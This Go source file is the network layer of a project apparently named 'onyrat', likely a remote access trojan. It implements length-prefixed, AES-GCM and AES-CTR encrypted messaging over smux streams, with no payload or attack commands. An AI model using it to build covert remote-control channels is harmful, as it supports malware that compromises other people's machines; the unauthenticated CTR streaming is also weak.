package network

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"time"

	"github.com/Onyz107/onyrat/internal/crypto"
	"github.com/Onyz107/onyrat/internal/logger"
	"github.com/xtaci/smux"
)

type Communicator interface {
	// Raw send/receive
	Send(stream *smux.Stream, data []byte, timeout time.Duration) error
	Receive(stream *smux.Stream, buf []byte, timeout time.Duration) error

	// Streamed send/receive
	NewStreamedSender(stream *smux.Stream, timeout time.Duration) (io.WriteCloser, error)
	NewStreamedReceiver(stream *smux.Stream, timeout time.Duration) (io.ReadCloser, error)

	// Serialized send/receive
	SendSerialized(stream *smux.Stream, data []byte, timeout time.Duration) error
	ReceiveSerialized(stream *smux.Stream, buf []byte, timeout time.Duration) (uint64, error)

	// Encrypted send/receive
	SendEncrypted(stream *smux.Stream, data []byte, timeout time.Duration) error
	ReceiveEncrypted(stream *smux.Stream, buf []byte, timeout time.Duration) (uint64, error)

	// Streamed encrypted
	NewStreamedEncryptedSender(stream *smux.Stream, timeout time.Duration) (io.WriteCloser, error)
	NewStreamedEncryptedReceiver(stream *smux.Stream, timeout time.Duration) (io.ReadCloser, error)

	// Close the communicator
	Close() error
}

func send(stream *smux.Stream, data []byte, timeout time.Duration) error {
	if timeout > 0 {
		stream.SetDeadline(time.Now().Add(timeout))
	}
	defer stream.SetDeadline(time.Time{})

	n, err := stream.Write(data)
	if err != nil {
		return fmt.Errorf("failed to send data: %w", err)
	}
	if n != len(data) {
		return fmt.Errorf("sent %d bytes instead of %d", n, len(data))
	}

	return nil
}

func newStreamedSender(stream *smux.Stream, timeout time.Duration) io.WriteCloser {
	return &deadlineWriter{s: stream, dur: timeout}
}

func sendSerialized(stream *smux.Stream, data []byte, timeout time.Duration) error {
	length := uint64(len(data))
	logger.Log.Debugf("Sending serialized data to client of length: %d", length)

	header := headerPool.Get().([]byte)
	defer headerPool.Put(header)

	binary.BigEndian.PutUint64(header, length)

	if err := send(stream, header, timeout); err != nil {
		return fmt.Errorf("failed to send header to client: %w", err)
	}

	if err := send(stream, data, timeout); err != nil {
		return fmt.Errorf("failed to send serialized data to client: %w", err)
	}

	return nil
}

func sendEncrypted(stream *smux.Stream, data, aesKey []byte, timeout time.Duration) error {
	encData, err := crypto.EncryptAESGCM(aesKey, data)
	if err != nil {
		return fmt.Errorf("encryption failed: %w", err)
	}

	return sendSerialized(stream, encData, timeout)
}

func newStreamedEncryptedSender(stream *smux.Stream, aesKey []byte, timeout time.Duration) (io.WriteCloser, error) {
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, fmt.Errorf("failed to create cipher: %w", err)
	}

	nonce := make([]byte, aes.BlockSize)
	rand.Read(nonce)

	streamWriter := newStreamedSender(stream, timeout)

	if _, err := streamWriter.Write(nonce); err != nil {
		return nil, fmt.Errorf("failed to send nonce: %w", err)
	}

	encryptedStreamWriter := &cipher.StreamWriter{
		S: cipher.NewCTR(block, nonce),
		W: streamWriter,
	}

	return encryptedStreamWriter, nil
}

func receive(stream *smux.Stream, buf []byte, timeout time.Duration) error {
	if timeout > 0 {
		stream.SetDeadline(time.Now().Add(timeout))
	}
	defer stream.SetDeadline(time.Time{})

	if _, err := io.ReadFull(stream, buf); err != nil {
		return fmt.Errorf("failed to receive data from client: %w", err)
	}

	return nil
}

func newStreamedReceiver(stream *smux.Stream, timeout time.Duration) io.ReadCloser {
	return &deadlineReader{s: stream, dur: timeout}
}

func receiveSerialized(stream *smux.Stream, buf []byte, timeout time.Duration) (uint64, error) {
	header := headerPool.Get().([]byte)
	defer headerPool.Put(header)

	if err := receive(stream, header, timeout); err != nil {
		return 0, fmt.Errorf("failed to receive header from client: %w", err)
	}

	maxDataSize := uint64(cap(buf))

	length := binary.BigEndian.Uint64(header)
	if length > maxDataSize {
		return 0, fmt.Errorf("data too large to receive got buffer with capacity of: %d received data with length of: %d", maxDataSize, length)
	}
	logger.Log.Debugf("Receiving serialized data from client with length of: %d", length)

	data := buf[:length] // Allocate exactly length amount of bytes (this does not really allocate since we are slicing the slice but you get me)
	if err := receive(stream, data, timeout); err != nil {
		return 0, fmt.Errorf("failed to receive data from client: %w", err)
	}

	return length, nil
}

func receiveEncrypted(stream *smux.Stream, buf, aesKey []byte, timeout time.Duration) (uint64, error) {
	n, err := receiveSerialized(stream, buf, timeout)
	if err != nil {
		return 0, err
	}

	data := buf[:n]

	plaintext, err := crypto.DecryptAESGCM(aesKey, data)
	if err != nil {
		return 0, err
	}

	n = uint64(copy(buf[:len(plaintext)], plaintext))
	return n, nil
}

func newStreamedEncryptedReceiver(stream *smux.Stream, aesKey []byte, timeout time.Duration) (io.ReadCloser, error) {
	reader := newStreamedReceiver(stream, timeout)

	nonce := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(reader, nonce); err != nil {
		return nil, fmt.Errorf("failed to read nonce: %w", err)
	}

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, fmt.Errorf("failed to create cipher: %w", err)
	}

	streamReader := &cipher.StreamReader{
		S: cipher.NewCTR(block, nonce),
		R: reader,
	}

	return struct {
		io.Reader
		io.Closer
	}{streamReader, reader}, nil
}
